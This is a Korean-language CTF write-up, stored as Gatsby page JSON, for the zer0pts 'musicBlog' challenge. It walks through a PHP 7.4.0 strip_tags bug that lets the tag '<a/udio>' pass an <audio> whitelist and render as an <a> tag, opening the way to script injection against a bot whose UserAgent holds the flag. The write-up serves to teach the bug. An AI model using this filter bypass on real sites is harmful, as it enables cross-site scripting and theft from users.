{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/zer0pts_music_ctf_writeup/",
    "result": {"data":{"cur":{"id":"55565dc5-cbc8-5090-b644-ed81b57385ca","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<blockquote>\n<p>Name\nmusicBlog</p>\n</blockquote>\n<blockquote>\n<p>Description\nYou can introduce favorite songs to friends with MusicBlog!</p>\n</blockquote>\n<blockquote>\n<p>File\nMusicBlog.tar.gz</p>\n</blockquote>\n<h2 id=\"dockerfile-분석\" style=\"position:relative;\"><a href=\"#dockerfile-%EB%B6%84%EC%84%9D\" aria-label=\"dockerfile 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DockerFile 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAApUlEQVQI103OXRKCIBSGYZdSWWoCIiKKJBCEqGNetP/NVPYzzDwX5+ad80WeK+1m7WZpfQrJPgW7U75PwCGFXxl62+44Q8dz8YOjodPXYVZ2kmbsjee9aXvDOkW5pFySRhSU41pUbU+aS47rsI8cV9Yvt3F10zrdH3ZcjV8w6yBpUNWCkqWQZKj6SEAZfC4iV3VSu5IJymXJRLwt/M+OMxQKy1f8BLLaLmWSAcCDAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/0a3dbac156713c43eaf10f4966a02558/37523/0.png\"\n        srcset=\"/static/0a3dbac156713c43eaf10f4966a02558/e9ff0/0.png 180w,\n/static/0a3dbac156713c43eaf10f4966a02558/f21e7/0.png 360w,\n/static/0a3dbac156713c43eaf10f4966a02558/37523/0.png 720w,\n/static/0a3dbac156713c43eaf10f4966a02558/cda19/0.png 785w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>PHP 7.4.0 버전을 사용하는 것을 확인할 수 있으며 해당 버전에 맞는 버그를 바탕으로 flag를 획득할 수 있겠다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">함수이름</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">await</span> 비동기 처리 메서드 <span class=\"token function\">명</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>함수의  앞에 async 라는 예약어를 붙인후, 함수 내부에서 비동기 처리가 필요한 메서드에 await를 붙여준다.</li>\n<li>await 붙인 메서드는 비동기 처리 메서드가 꼭 promise 객체를 반환해야 await가 의도한 대로 동작한다.</li>\n</ul>\n<h2 id=\"flag-문자열-찾기\" style=\"position:relative;\"><a href=\"#flag-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%B0%BE%EA%B8%B0\" aria-label=\"flag 문자열 찾기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>flag 문자열 찾기</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 647px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAABnklEQVQoz4WSi2rjMBBF/StbO3prNHrLtpI2TjbdEgpl//9jFtlstpSyhmGQjY64d+50B2W5dky7numeqUcNHHarM9ppP0tbuIncFmYSx8wxHYTZh62y0s0rU1R8Fm6WoUpficB9mEHQmBTGgcqeiK1+ENEzvQ9nm2y+YVyym0KscTxpzOASUWYQZmCwzuLfQ5/PHRWY40lOr5CX4sZUr+G45LKM0y8TpoEDB0+1o9pxCAw8Ay8wMu022FSbplClO6Kt0Z9zuphwxnyVJnITpE0CY+smSkwS288Db+Pseg5UmKMJ/nQP8/tYLimfIL2Y8dyY9fYGE4lU2YMwjyC69sFB2vx6/5ifrzoc/fkD5xvHsjn861n3m+HPnnsOQvtkEzOZ6SShyFCFzUQA1Y4pJ0ykyn07/G6QGGxeymX8+TvUG/q5LYmJRCJRdpNK5PeZd0SiUJbiRCGDrwp9z9QTU8Oq8EtOX2Gu/JwXM7/Z+R7KFcsLpFMsFcK0u6FtwwYdiY7NM7ROISoT6JrkDkyV5eCYtj1VTWTr6um/ah/wH31/n2hjDFZ8AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/e2bdef089c91fc681b0e6f102b39ce14/ca12d/1.png\"\n        srcset=\"/static/e2bdef089c91fc681b0e6f102b39ce14/e9ff0/1.png 180w,\n/static/e2bdef089c91fc681b0e6f102b39ce14/f21e7/1.png 360w,\n/static/e2bdef089c91fc681b0e6f102b39ce14/ca12d/1.png 647w\"\n        sizes=\"(max-width: 647px) 100vw, 647px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>flag 문자열을 검색하여 <code class=\"language-text\">worker.js</code> 소스코드를 확인할 수 있다.</li>\n<li>해당 코드를 보면 재선언, 재할당이 불가능하도록 설정되어 있다. <code class=\"language-text\">zer0pts{&lt;censored>}</code></li>\n<li>setUserAgent 메서드를 바탕으로 flag 값을 UserAgent로 설정하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"samplepage\" style=\"position:relative;\"><a href=\"#samplepage\" aria-label=\"samplepage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SamplePage</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAApElEQVQY05WQMQ7CMAxFc//zsHAKJIYiysDUhhLHjZ0madKQQlvEwgJPlv31JUvfFp1Sl+p0reve0DzPpZT5Z4QLAWU7IAzOW2uJmYjYWqJFbJ1X02yCFwxRTFEY5laBVNBKKW/dXSkAQOzXQq1Ra409wjIQQHvnQxi99zlnMTKbpjFdZwdniGNMf8R+nKu03+Xj4WOV9e5SSkrTOL2fUL54LT8B3FwgLsb9heMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/00596cc8f493e4b9835a4b479ae36c80/37523/2.png\"\n        srcset=\"/static/00596cc8f493e4b9835a4b479ae36c80/e9ff0/2.png 180w,\n/static/00596cc8f493e4b9835a4b479ae36c80/f21e7/2.png 360w,\n/static/00596cc8f493e4b9835a4b479ae36c80/37523/2.png 720w,\n/static/00596cc8f493e4b9835a4b479ae36c80/302a4/2.png 1080w,\n/static/00596cc8f493e4b9835a4b479ae36c80/0940f/2.png 1154w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAuElEQVQI1zXJWW7CMBAG4BwEqAvYHhtvWQQ0XmYceAJSpN7/MBVNkb6Hf2nADzqcnGsPxgvtufYczIuyXDkOdv+qVij3t1gO9j8o2xgQxz6cj8NE5UKY41fFjDnWkq4VK2YqCXPENE6YcjxXypjGRcP6q738mDLrPLf1GejRT8+WZoMzlG+IN4j3TTetPK4DrQJtQl0HWjRySLIb1cFx2+2020m1lXor9afQTGjG1cceGFdsqW/L+wtwqy4apbDjvwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/a489223691495c1859e583ade462be8c/37523/3.png\"\n        srcset=\"/static/a489223691495c1859e583ade462be8c/e9ff0/3.png 180w,\n/static/a489223691495c1859e583ade462be8c/f21e7/3.png 360w,\n/static/a489223691495c1859e583ade462be8c/37523/3.png 720w,\n/static/a489223691495c1859e583ade462be8c/4ff83/3.png 843w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Sample Page 분석시 <code class=\"language-text\">&lt;audio></code> 태그를 사용하여 post 올릴 수 있는것으로 추정된다.</li>\n</ul>\n<h2 id=\"postphp-분석\" style=\"position:relative;\"><a href=\"#postphp-%EB%B6%84%EC%84%9D\" aria-label=\"postphp 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>post.php 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAj0lEQVQI1x3K6wrCMAxA4b2LK7ZpujQ1TW8ON5wKvv8DyYSP8+tMKCWPjeoe8gohOUyWxEUBUkj9xNVzgaTIekU2EA2Q8TTDMoVaj8fx3d+yHrR9uG+e2/++eVKfGnBz3CBWZCVpPnXPirm4KFPQOu6v3p8oA3VAqjaII4WgLhYXi+eMnIHEAF1smN1ysmd/oawixq/CP1EAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/e8fc8e56599ca66f4683b7ce6a13c294/37523/4.png\"\n        srcset=\"/static/e8fc8e56599ca66f4683b7ce6a13c294/e9ff0/4.png 180w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/f21e7/4.png 360w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/37523/4.png 720w,\n/static/e8fc8e56599ca66f4683b7ce6a13c294/2e367/4.png 1066w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>post를 게시할 때 문자열 필터링을 하는 부분이 존재한다. 해당 부분은 <code class=\"language-text\">render_tags</code> 함수를 바탕으로 제어된다.</li>\n</ul>\n<h2 id=\"utilphp-분석\" style=\"position:relative;\"><a href=\"#utilphp-%EB%B6%84%EC%84%9D\" aria-label=\"utilphp 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>util.php 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiElEQVQI1z2MWw6DIBAAvYuAu4sL7FJB0Zo+Ppve/zqNIWkymczXDMttb/ujtqeUnWKGmA1F68V5sZQsJefVeZlmcT5aujDYzUPZ3np+18dHjkOPV6gbpTWUk5f7nBukStpIVtaKMQNn4OsFrMA6JCkT5/4zXixGg8Egj8i2B8wj8B+DbDD0/gEI9SB96RxYlQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/8046a8f895df08c0204b5a3ac048eeea/37523/5.png\"\n        srcset=\"/static/8046a8f895df08c0204b5a3ac048eeea/e9ff0/5.png 180w,\n/static/8046a8f895df08c0204b5a3ac048eeea/f21e7/5.png 360w,\n/static/8046a8f895df08c0204b5a3ac048eeea/37523/5.png 720w,\n/static/8046a8f895df08c0204b5a3ac048eeea/146da/5.png 943w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">redner_tags</code> 함수는 util.php에 구현되어 있으며 사용자의 입력값을 인자로 받아와 <code class=\"language-text\">preg_replace</code> 함수를 바탕으로,</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\[\\[(.+?)\\]\\]/'</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string single-quoted-string\">'&lt;audio controls src=\"\\\\1\">&lt;/audio>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'[[www.naver.com]]'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">=></span>\n<span class=\"token operator\">&lt;</span>audio controls src<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"www.naver.com\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>audio<span class=\"token operator\">></span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">[[URL]]</code> 정규화를 바탕으로 <code class=\"language-text\">&lt;audio></code> 치환되는 모습을 확인할 수 있다</li>\n<li>두번 째 필터로는 <code class=\"language-text\">strip_tags</code> 함수로 <code class=\"language-text\">&lt;audio></code> 태그를 정확히 써야 허용되는 메서드이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => allows</span>\n<span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;script>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'&lt;audio>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// => Deny</span></code></pre></div>\n<ul>\n<li>하지만 두 번째 필터링 부분에서 PHP 버그가 발생한다.</li>\n</ul>\n<h2 id=\"strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\" style=\"position:relative;\"><a href=\"#strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\" aria-label=\"strip_tags allows  in tag name allowing whitelist bypass in browsers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>strip_tags allows / in tag name, allowing whitelist bypass in browsers</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABbklEQVQoz42Ri27jIBRE+f/fi5o20m6ME78wD5trzAVsoHKsNJZ2290RQggxMGcg11/387mk9F7eypKWHWNVXRfXglJaFLQsb23bdR0DAIs2hBBjzE+R4IMUfdPWGvQ8z4jWmKmqqhvt7pUMYck5SyE/Pi7X31daUGttzjmltJk557S4VRUzBhEXa4MxyBir68YY670PIRhjAGCaJq01IoanSNs2RdGfTu35vT6d7m9vzeVSDyOEEFJK8aGU01fUr80YI5FSmgmWxXvvrDWIFu08TYCIKeUY0/H0uq75IKKk5FyMGrQeAQCdQ9wHOuec98F75/alf9z4SkEAYHxoGAalho3swbZDOud2vB1+YzkgECF42zasZ0opuaXgUkqllOBCqYFvsxJS9IwLIUHD4eFMxnGEaTr+3kvpVVL+m4i1NoRljeuyLOu6/tnKD9qYBzXMdn4WtNXzv2bv/fbUN8H+YZZS9n2PiD+wfWf+BF4F7+I3NQJ+AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/77f87ef0b690582030395c32afb73b29/37523/6.png\"\n        srcset=\"/static/77f87ef0b690582030395c32afb73b29/e9ff0/6.png 180w,\n/static/77f87ef0b690582030395c32afb73b29/f21e7/6.png 360w,\n/static/77f87ef0b690582030395c32afb73b29/37523/6.png 720w,\n/static/77f87ef0b690582030395c32afb73b29/dd104/6.png 1064w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">strip_tags</code> 관련 bug를 확인하면 만약 <code class=\"language-text\">&lt;strong></code> 태그를 화이트리스트에 존재할 경우 <code class=\"language-text\">&lt;s/trong></code> 구문도 그대로 복사되어 유지되는 모습을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"php-bug-테스트\" style=\"position:relative;\"><a href=\"#php-bug-%ED%85%8C%EC%8A%A4%ED%8A%B8\" aria-label=\"php bug 테스트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Bug 테스트</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAgklEQVQoz52RsQ7DMAhE/f+f1X/oVEXdUqlT64TDBowrlEwdmrhPJxZ0wIk0P+ZpugPo46Scl9c7q6qPkypx9+6hcbOUqmpm5vuIs4qzwcylMJfWfChwbO7/0ponq1hXIgIBumNbPc58uVH4CTEgMgQA1yrHr7o+twDfDRFZ0MR+mT/hDBVhhLIGwwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/7176eb6e8e1466dc2fe2939a62052251/37523/7.png\"\n        srcset=\"/static/7176eb6e8e1466dc2fe2939a62052251/e9ff0/7.png 180w,\n/static/7176eb6e8e1466dc2fe2939a62052251/f21e7/7.png 360w,\n/static/7176eb6e8e1466dc2fe2939a62052251/37523/7.png 720w,\n/static/7176eb6e8e1466dc2fe2939a62052251/302a4/7.png 1080w,\n/static/7176eb6e8e1466dc2fe2939a62052251/e6c84/7.png 1148w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQY003Oy0rDQAAF0PxHIamZR+bVJNM0TbBqFbf+pSCCH+HCVSmCTuKDurA7hSZNwU2rzkQSUXK528O9VlGU89nsbn77ulzeK7UqyrpNlikxjAfxfjBKqC8ZpVxwTCgEAP7F2mnzsV6bsmiEMXVda60brBQTPo8nNBhyzomHAYRuRzZ4u6k2L4uv9zdTVabd/MV5nnkIEMb9UEacMA9RD3NKMHQRBBgjBPas78Xz7vJ8e3XxeXNdd3CWP7pM9sWYpacynQZRIuJDEh/1qXSodHjkkNBqrmpdm7YdrB6e7EFqh1Pv4EwkJ2h0bPuTHhv3ePLfH/QamXfSjXTqAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/f27b347e989ad6f4b10507ab9482f67c/37523/8.png\"\n        srcset=\"/static/f27b347e989ad6f4b10507ab9482f67c/e9ff0/8.png 180w,\n/static/f27b347e989ad6f4b10507ab9482f67c/f21e7/8.png 360w,\n/static/f27b347e989ad6f4b10507ab9482f67c/37523/8.png 720w,\n/static/f27b347e989ad6f4b10507ab9482f67c/8bd7c/8.png 845w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">&lt;audio></code> 태그 부분에 <code class=\"language-text\">/</code> 을 입력하여 <code class=\"language-text\">strip_tags</code> 메서드 버그로 인하여 다음과 같이</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">udio</span><span class=\"token punctuation\">></span></span>PHP BUG<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">a</code> 태그 로 인식하게되어 우회가 가능하다. 